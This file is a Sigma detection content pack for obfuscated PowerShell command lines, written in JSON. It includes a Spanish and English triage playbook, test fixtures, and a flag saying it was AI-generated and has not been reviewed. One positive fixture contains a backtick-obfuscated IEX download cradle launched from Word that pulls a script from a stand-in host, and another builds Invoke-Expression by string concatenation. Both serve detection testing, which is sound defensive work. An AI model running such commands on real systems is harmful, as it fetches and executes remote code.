@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "d7bcd677-645d-4691-a8d4-7a5602b780d1",
+    "title": "Potential PowerShell Command Line Obfuscation",
+    "level": "high",
+    "status": "test",
+    "author": "Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton (fp)",
+    "path": "windows/process_creation/proc_creation_win_powershell_cmdline_special_characters.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_cmdline_special_characters.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se inició PowerShell (powershell.exe o pwsh.exe) con una línea de comandos que contiene muchos caracteres especiales (+, {, ^ o `), un patrón típico de ofuscación para evadir detecciones.",
+      "what_it_detects": "Procesos de PowerShell cuyo CommandLine tiene al menos 14 signos '+', 10 llaves '{', 5 caracteres '^' o 5 backticks '`'. Quedan excluidos los procesos lanzados por ssm-document-worker.exe de Amazon SSM y algunos scripts conocidos de Microsoft Defender ATP.",
+      "why_it_matters": "Los atacantes concatenan cadenas, insertan backticks o carets y usan bloques anidados para ocultar comandos como IEX o descargas (T1027, información ofuscada) al ejecutar PowerShell (T1059.001). Esto suele indicar una ejecución maliciosa en curso.",
+      "triage_steps": [
+        "Revise el CommandLine completo y desofusque: quite los backticks y carets, y resuelva las concatenaciones con '+' para obtener el comando real.",
+        "Identifique ParentImage y su línea de comandos: Office, wscript, mshta, cmd o un servicio web como padre son mucho más sospechosos que un agente de gestión.",
+        "Confirme el usuario y el host. Valide si la cuenta suele ejecutar PowerShell y si el equipo es una estación de trabajo o un servidor.",
+        "Busque procesos hijos y conexiones de red del mismo proceso, y el mismo host +/- 15 minutos: descargas, DNS a dominios raros, archivos nuevos en %TEMP%.",
+        "Revise los registros Script Block (4104) de PowerShell para ver el contenido desofuscado que se ejecutó.",
+        "Busque el mismo CommandLine o el mismo hash de script en otros hosts, y alertas previas para este usuario o equipo."
+      ],
+      "false_positives": [
+        "Amazon SSM Document Worker que ejecuta documentos con muchas concatenaciones o llaves (ya filtrado si el padre coincide con la ruta exacta).",
+        "Scripts de Windows Defender ATP o de otras herramientas de seguridad que incrustan código C# o bloques anidados.",
+        "Scripts legítimos de administración o despliegue (SCCM, Intune, RMM) con muchos bloques {} o concatenación de cadenas."
+      ],
+      "response_steps": [
+        "Verifique con el dueño del equipo o el equipo de TI si el comando corresponde a una tarea legítima antes de actuar.",
+        "Si es malicioso, aísle el endpoint desde el EDR y conserve la memoria y los registros de PowerShell.",
+        "Bloquee los dominios, IP y hash identificados y búsquelos en todo el entorno.",
+        "Elimine la persistencia encontrada (tareas programadas, claves Run, servicios) y restablezca las credenciales del usuario afectado.",
+        "Si es legítimo, documente la excepción con un filtro específico por ParentImage o por script, nunca por PowerShell en general."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque esta densidad de caracteres de ofuscación en PowerShell es rara en uso legítimo y suele anteceder a la ejecución de código malicioso."
+    },
+    "en": {
+      "summary": "PowerShell (powershell.exe or pwsh.exe) was started with a command line containing many special characters (+, {, ^ or `), a common obfuscation pattern used to evade detection.",
+      "what_it_detects": "PowerShell processes whose CommandLine contains at least 14 '+' signs, 10 '{' braces, 5 '^' carets or 5 '`' backticks. Processes spawned by Amazon SSM's ssm-document-worker.exe and specific Microsoft Defender ATP scripts are excluded.",
+      "why_it_matters": "Attackers concatenate strings, insert backticks or carets and nest blocks to hide commands such as IEX or downloads (T1027, obfuscated information) while running PowerShell (T1059.001). It often indicates active malicious execution.",
+      "triage_steps": [
+        "Read the full CommandLine and deobfuscate it: strip backticks and carets and resolve '+' concatenations to reveal the real command.",
+        "Check ParentImage and its command line: Office, wscript, mshta, cmd or a web server parent is far more suspicious than a management agent.",
+        "Confirm the user and host. Does this account normally run PowerShell? Is the host a workstation or a server?",
+        "Look at child processes and network connections of this process, and the same host +/- 15 minutes: downloads, unusual DNS, new files in %TEMP%.",
+        "Review PowerShell Script Block logs (event 4104) for the deobfuscated content that actually ran.",
+        "Search other hosts for the same CommandLine or script hash, and check earlier alerts for this user or host."
+      ],
+      "false_positives": [
+        "Amazon SSM Document Worker running documents with heavy concatenation or braces (already filtered when the parent matches the exact path).",
+        "Windows Defender ATP or other security tooling scripts that embed C# code or nested blocks.",
+        "Legitimate admin or deployment scripts (SCCM, Intune, RMM) with many {} blocks or string concatenation."
+      ],
+      "response_steps": [
+        "Verify with the host owner or IT whether the command matches a legitimate task before acting.",
+        "If malicious, isolate the endpoint via EDR and preserve memory and PowerShell logs.",
+        "Block identified domains, IPs and hashes and hunt for them across the environment.",
+        "Remove any persistence found (scheduled tasks, Run keys, services) and reset the affected user's credentials.",
+        "If legitimate, document a narrow exception by ParentImage or script, never for PowerShell as a whole."
+      ],
+      "severity_rationale": "High fits because this density of obfuscation characters in PowerShell is rare in legitimate use and commonly precedes malicious code execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "powershell.exe launched from Word with backtick-obfuscated IEX download cradle (5 backticks)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -NoP -W Hidden -C \"i`e`x (n`e`w-o`bject Net.WebClient).DownloadString('http://payload.example.com/a.ps1')\""
+        }
+      },
+      {
+        "description": "pwsh.exe building Invoke-Expression via character-by-character string concatenation (16 plus signs)",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-07.andes.example.com",
+          "User": "ANDES\\svc_build",
+          "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+          "OriginalFileName": "pwsh.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "pwsh.exe -c \"$c='I'+'n'+'v'+'o'+'k'+'e'+'-'+'E'+'x'+'p'+'r'+'e'+'s'+'s'+'i'+'o'+'n'; & $c 'Get-Date'\""
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Routine admin PowerShell command with a single brace block, below every threshold",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -NoProfile -Command \"Get-ChildItem C:\\Logs | Where-Object {$_.Length -gt 1MB}\""
+        }
+      },
+      {
+        "description": "Backtick-heavy command run by Amazon SSM Document Worker, excluded by the SSM filter",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-EC2-03.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "ParentImage": "C:\\Program Files\\Amazon\\SSM\\ssm-document-worker.exe",
+          "CommandLine": "powershell.exe -Command \"Write-Output `\"Patch`\" `\"run`\" `\"complete`\"\""
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
